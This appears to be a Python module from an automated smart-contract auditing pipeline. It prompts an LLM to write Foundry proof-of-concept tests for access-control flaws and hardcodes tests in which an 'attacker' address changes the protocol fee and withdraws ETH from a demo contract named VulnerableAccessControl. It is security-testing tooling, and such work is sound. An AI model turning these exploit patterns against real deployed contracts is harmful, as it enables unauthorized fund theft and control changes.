"""
Node 2: PoC Builder (PoC 生成节点)

简化版 - 生成 Foundry 测试代码验证访问控制漏洞
"""

from langchain_openai import ChatOpenAI
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.output_parsers import StrOutputParser

from ..core.state_schema import AuditGraphState
from ..core.config import get_settings


# 简化的 PoC 生成提示（通用 LLM 路径）
BUILDER_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """You are a security researcher who writes Foundry tests to verify access control vulnerabilities.

Generate a minimal PoC test that:
1. Setup: Deploy the target contract
2. Actor: Create an unauthorized address (attacker)
3. Action: Use vm.prank(attacker) to call the sensitive function
4. Assert: Verify the unauthorized action succeeded

The test should PASS if vulnerability exists (attack succeeds).
The test should FAIL/revert if access control works.

Key Foundry cheatcodes:
- vm.prank(address): Impersonate for next call
- makeAddr("name"): Create labeled address  
- assertEq(a, b): Assert equality

Output ONLY Solidity code, no explanations."""),
    ("human", """Generate a Foundry PoC for:

Contract:
```solidity
{contract_source}
```

Contract Name: {contract_name}
Target Function: {target_function}
Vulnerability: {audit_hypothesis}
Static Analysis Facts:
{static_context}

{error_context}

Generate the test file:""")
])


def build_verification_poc(state: AuditGraphState) -> AuditGraphState:
    """
    生成 PoC 测试代码
    
    输入: audit_hypothesis, current_target_function
    输出: verification_poc
    """
    settings = get_settings()

    contract_name = state.get("contract_name", "Contract")
    # 优先使用 Analyst 给出的目标函数；如果没有，仍然可能是 Demo 合约，这里给一个合理默认值
    target_function = state.get("current_target_function", "")

    # 针对 Demo 合约的精确定制 PoC，避免 LLM 不稳定
    if contract_name == "VulnerableAccessControl":
        # 如果 Analyst 没选出目标函数，就优先验证 withdraw（资金直接被提走，更直观）
        if not target_function:
            target_function = "withdraw"

        poc_code = get_demo_poc_for_vulnerable_access_control(target_function)

        training_examples = state.get("training_examples", [])
        if state.get("collect_training_data"):
            training_examples.append({
                "task": "generate_poc",
                "input": {
            "contract_source": state["contract_source"],
            "target_function": target_function,
            "hypothesis": state.get("audit_hypothesis", "")
                },
                "output": {"poc_code": poc_code}
            })

        return {
            **state,
            "verification_poc": poc_code,
            "execution_result": "pending",
            "training_examples": training_examples,
        }

    # 通用路径：调用 LLM 生成 PoC
    llm = ChatOpenAI(
        model=settings.openai_model,
        temperature=0.2,
        api_key=settings.openai_api_key
    )

    # 错误上下文（重试时）
    error_context = ""
    if state.get("retry_count", 0) > 0 and state.get("error_message"):
        error_context = f"""
Previous attempt failed:
```
{state['error_message']}
```
Fix the issues in the new PoC."""
    
    chain = BUILDER_PROMPT | llm | StrOutputParser()
    
    try:
        poc_code = chain.invoke({
            "contract_source": state["contract_source"],
            "contract_name": contract_name,
            "audit_hypothesis": state.get("audit_hypothesis", ""),
            "target_function": target_function,
            "static_context": state.get("static_analysis_summary", ""),
            "error_context": error_context
        })
        
        poc_code = clean_code_output(poc_code)
        
        new_retry_count = state.get("retry_count", 0)
        if error_context:
            new_retry_count += 1
        
        # 收集训练数据
        training_examples = state.get("training_examples", [])
        if state.get("collect_training_data"):
            training_examples.append({
                "task": "generate_poc",
                "input": {
                    "contract_source": state["contract_source"],
                    "target_function": target_function,
                    "hypothesis": state.get("audit_hypothesis", "")
                },
                "output": {"poc_code": poc_code}
            })
        
        return {
            **state,
            "verification_poc": poc_code,
            "retry_count": new_retry_count,
            "execution_result": "pending",
            "training_examples": training_examples
        }
        
    except Exception as e:
        return {
            **state,
            "error_message": f"PoC generation failed: {str(e)}",
            "verification_poc": ""
        }


def clean_code_output(code: str) -> str:
    """清理 LLM 输出的代码"""
    code = code.strip()
    
    if code.startswith("```solidity"):
        code = code[len("```solidity"):].strip()
    elif code.startswith("```"):
        code = code[3:].strip()
    
    if code.endswith("```"):
        code = code[:-3].strip()
    
    return code


def get_poc_template(contract_name: str, target_function: str) -> str:
    """PoC 基础模板"""
    return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/{contract_name}.sol";

contract {contract_name}Test is Test {{
    {contract_name} public target;
    address public attacker;
    address public owner;

    function setUp() public {{
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        
        vm.startPrank(owner);
        target = new {contract_name}();
        vm.stopPrank();
    }}

    function test_AccessControlVulnerability() public {{
        vm.prank(attacker);
        target.{target_function}();
        // If no revert, vulnerability exists
    }}
}}
'''


def get_demo_poc_for_vulnerable_access_control(target_function: str) -> str:
    """
    针对 VulnerableAccessControl 合约的固定 PoC。

    - setProtocolFee: 未授权地址成功修改 protocolFee；
    - withdraw: 未授权地址成功提走合约资金。
    """
    if target_function == "setProtocolFee":
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableAccessControl.sol";

contract VulnerableAccessControl_SetProtocolFee_PoC is Test {
    VulnerableAccessControl public target;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");

        // 部署合约，由任意 owner 部署
        target = new VulnerableAccessControl();
    }

    function test_UnauthorizedSetProtocolFee() public {
        // 未授权地址尝试修改协议费率
        vm.prank(attacker);
        target.setProtocolFee(9999);

        // 如果没有 Revert 且 fee 被修改，则存在访问控制漏洞
        assertEq(target.protocolFee(), 9999, "Attacker failed to change protocol fee");
    }
}
"""

    # 默认：withdraw 漏洞 PoC
    return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableAccessControl.sol";

contract VulnerableAccessControl_Withdraw_PoC is Test {
    VulnerableAccessControl public target;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");

        // 部署合约
        target = new VulnerableAccessControl();

        // 给合约转入一些 ETH 作为受害资金
        deal(address(target), 10 ether);
    }

    function test_UnauthorizedWithdraw() public {
        uint256 attackerBefore = attacker.balance;

        // 未授权地址直接提走资金
        vm.prank(attacker);
        target.withdraw(1 ether);

        uint256 attackerAfter = attacker.balance;

        // 如果没有 Revert 且余额增加，则存在访问控制漏洞
        assertGt(attackerAfter, attackerBefore, "Attacker did not receive funds");
    }
}
"""
